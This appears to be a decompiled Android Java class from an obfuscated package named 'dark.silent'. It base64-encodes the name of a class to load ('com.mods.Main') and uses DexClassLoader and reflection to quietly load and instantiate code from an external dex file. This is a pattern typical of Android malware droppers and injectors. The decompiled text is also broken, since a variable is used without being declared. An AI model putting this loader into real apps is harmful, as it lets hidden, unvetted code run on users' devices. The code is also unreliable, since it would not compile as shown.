package dark.silent.a;

import android.content.Context;
import android.os.Bundle;
import android.util.Base64;
import com.squareup.leakcanary.android.noop.BuildConfig;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.lang.reflect.Constructor;

public final class b {
    public final String a;
    public final String b;
    public final String c;
    public Object d;
    public String e;
    public String f;
    private final byte[] g;
    private ClassLoader h;

    public b(String str, String str2, String str3) {
        this.a = str;
        this.b = str2;
        if (str3 == null) {
            str3 = BuildConfig.VERSION_NAME;
        }
        this.c = str3;
        this.g = Base64.decode("Y29tLm1vZHMuTWFpbg==", 0);
        this.d = null;
        this.h = null;
        this.e = null;
        this.f = null;
    }

    public final boolean a() {
        return this.d != null;
    }

    public final boolean a(Context context, File file) {
        this.h = new DexClassLoader(file.getAbsolutePath(), context.getDir("outmof", 0).getAbsolutePath(), null, context.getClassLoader());
        Bundle bundle = new Bundle();
        if (this.e != null) {
            bundle.putStringArray("EXTRA_META", new String[]{this.e, this.f});
        }
        try {
            Constructor[] constructors = this.h.loadClass(new String(this.g)).getConstructors();
            r4 = new Object[3];
            r4[1] = new String[]{this.a, this.b, this.c};
            r4[2] = bundle;
            this.d = constructors[0].newInstance(r4);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
